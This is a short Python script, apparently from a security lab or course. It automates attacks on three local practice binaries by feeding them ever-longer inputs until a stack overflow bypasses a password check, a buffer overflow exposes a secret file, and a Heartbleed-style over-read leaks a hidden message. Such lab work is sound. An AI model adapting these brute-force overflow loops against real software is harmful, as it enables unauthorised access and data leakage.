#!/usr/bin/python
from subprocess import *

def stack_overflow():

    stdout = []
    hack_password = "1"
    counter = 0

    while ("Now entering" not in stdout):
        print("Trying password {} with {} characters".format(hack_password, len(hack_password)))
        proc = Popen(["./stack_overflow"], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        proc.stdin.write(hack_password + '\n')
        hack_password += "1"

        proc.stdin.flush()  
        stdout,stderr = proc.communicate()  
        print(stdout)  
        print(stderr)
        counter += 1

    print("\n Code hacked at {} characters".format(counter))


def buffer_overflow():

    stdout = []
    filename = "wsecret.txt"
    counter = 1
    while ("You should not be able to read" not in stdout):
        
        proc = Popen(["./buffer_overflow " + filename], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        filename = "w" + filename
        stdout,stderr = proc.communicate()  
        print(stdout)  
        print(stderr)
        counter += 1

   
    print("\n Code hacked at {} characters".format(counter))

def heart_bleed():
    stdout = []

    counter = 1

    while ("!" not in stdout):
        proc = Popen(["./heartbleed " + str(counter)], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        stdout,stderr = proc.communicate()  
        print(stdout)  
        print(stderr)

        counter += 1

    print("Final message is {}".format(stdout.replace("\n", "")))

stack_overflow()    
#buffer_overflow()
#heart_bleed()